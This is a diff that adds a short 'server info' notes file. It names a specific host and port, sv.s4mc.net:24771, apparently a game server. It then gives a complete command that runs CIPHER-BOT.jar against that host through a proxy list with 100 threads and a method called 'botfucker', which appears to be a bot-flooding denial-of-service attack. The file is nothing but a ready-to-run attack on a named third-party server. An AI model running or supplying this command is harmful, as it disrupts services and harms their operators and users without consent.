@@ -1,0 +1,7 @@
+server info
+
+ip: sv.s4mc.net:24771
+
+prot: 24771
+
+java -jar CIPHER-BOT.jar host=sv.s4mc.net:24771 prot=24771 proxies=cipher-bot.txt threads=100 time=20 method=botfucker
